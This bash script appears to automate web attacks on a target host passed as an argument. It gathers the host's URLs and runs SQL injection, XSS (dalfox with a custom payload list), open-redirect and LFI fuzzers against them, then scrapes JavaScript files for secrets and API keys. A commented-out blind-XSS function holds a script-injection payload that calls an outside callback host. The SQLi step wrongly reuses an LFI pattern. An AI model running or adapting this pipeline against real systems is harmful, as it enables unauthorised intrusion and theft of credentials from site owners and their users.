#!/bin/bash
host=$1
url="good_js_url.txt"


live_url(){
echo "$host" | gauplus | tee -a url.txt
#cat url.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.svg|\.css|\.ico" | sed 's/:88//9;s/:443//g' | sort -u >> remove_url.txt
cat url.txt | sort --unique | tee -a nice_url.txt
parameters -l nice_url.txt -o all_prem.txt
}
live_url

gf_patterns(){
cat all_prem.txt | grep "=" | tee -a  all_param_url.txt
mkdir gf
cd gf
gf xss all_prem.txt | tee -a xss.txt
gf my-lfi all_prem.txt | tee -a my-lfi.txt
gf my-lfi all_prem.txt | tee -a sqli.txt
gf redirect all_prem.txt |  tee -a my-Redirect.txt
gf aws-keys all_prem.txt |  tee -a aws-keys-json.txt
gf servers all_prem.txt |  tee -a servers.txt
gf debug-pages all_prem.txt | tee -a debug-pages.txt
gf debug_logic all_prem.txt |  tee -a debug_logic.txt
gf img-traversal all_prem.txt |  tee -a img-traversal.txt
gf php-sources all_prem.txt |  tee -a php-sources.txt
gf upload-fields all_prem.txt | tee -a upload-fields.txt
gf php-errors all_prem.txt | tee -a php-errors.txt
gf http-auth all_prem.txt |  tee -a http-auth.txt
gf idor all_prem.txt |  tee -a idor.txt
gf interestingparams all_prem.txt |  tee -a interestingparams.txt
gf interestingEXT all_prem.txt |  tee -a interestingEXT.txt
gf rce all_prem.txt |  tee -a rce.txt
cd ..
}
gf_patterns

SQL(){
sed 's/=.*$/=/' all_param_url.txt | tee -a rady-sql.txt
mrco24-error-sql -f all_param_url.txt -t 40  -o error-sql-injection.txt -v
mrco24-error-sql -f all_prem.txt  -t 40  -o all-error-sql-injection.txt -v
time-sql -l rady-sql.txt -p  /root/wordlist/mrco24-wordlist/time-sql.txt -o only-param-time-sql-injection.txt
time-sql -l all_prem.txt -p  /root/wordlist/mrco24-wordlist/time-sql.txt -o only-param-time-sql-injection.txt
#nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header-blind-time-sql-injection.yaml -c 100  -o header-blind-time-sql-injection.txt -v
#nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header-blind-sql-injection.yaml -c 100  -o header-blind-sql-injection.txt -v
#sqlmap -m valid_urls.txt --batch --risk 3  --random-agent | tee -a sqlmap_sql_url.txt
}
SQL

Refactors_xss(){
cat all_prem.txt | kxss | tee -a  kxss_url.txt
cat kxss_url.txt | awk -F' ' '{print $NF}' | sort --unique | tee -a kxss_url_active.txt
dalfox file kxss_url_active.txt  --custom-payload /root/wordlist/mrco24-wordlist/Xss-Payload.txt -o xss_poc.txt
}
Refactors_xss

Open_Redirect(){
sed 's/=.*$/=/' all_param_url.txt | tee -a rady_open.txt
open-redirect -l rady_open.txt -p /root/wordlist/mrco24-wordlist/open-redirect.txt -o open_redirect.txt -t 20 -v
open-redirect -l all_prem.txt -p /root/wordlist/mrco24-wordlist/open-redirect.txt -o allurl_open_redirect.txt -t 20 -v
#nuclei -l /root/recon/$domain/url/valid_urls.txt -t /root/templates/fuzzing-templates/redirect/open-redirect.yaml -c 60  -o /root/recon/$domain/scan/nuclei/urls_redirect.txt -v
}
Open_Redirect

dir-traversal(){
sed 's/=.*$/=/' all_param_url.txt | tee -a rady_lfi.txt
mrco24-lfi -f rady_lfi.txt -p /root/wordlist/mrco24-wordlist/lfi_payloads.txt -t 50 -o lfi.txt
mrco24-lfi -f all_prem.txt -p /root/wordlist/mrco24-wordlist/lfi_payloads.txt -t 50 -o all_url_lfi.txt
}
dir-traversal

#Bilnd_xss(){
#for domain in $(cat $host);
#do
#dalfox valid_urls.txt  pipe -b '"><script src=https://mrco.bxss.in></script>' -w 300 — multicast — mass — only-poc -o dalfox_blind_xss.txt
##nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header_blind_xss.yaml -c 100  -o header_blind_xss.txt -v
#done
#}
#Bilnd_xss


Get_js(){
cat nice_url.txt | getJS --complete | tee all_js_url.txt
cat all_js_url.txt | sort --unique | tee good_js_url.txt
#relative-url-extractor https://github.com/jobertabma/relative-url-extractor
#LinkFinder https://github.com/GerbenJavado/LinkFinder
}
Get_js


SecretFinder_js(){
python3 /root/OK-VPS/tools/SecretFinder/SecretFinder.py -i $url -o cli | tee -a js_SecretFinder.txt
}
SecretFinder_js

Js_Api(){
cat good_js_url.txt | mantra | tee -a  js_api_key.txt
}
Js_Api

#Dom_xss(){
#for domain in $(cat $host);
#do
#cat good_js_url.txt | /root/OK-VPS/tools/findom-xss/./findom-xss.sh | tee -a Dom_xss.txt
#done
#}
#Dom_xss
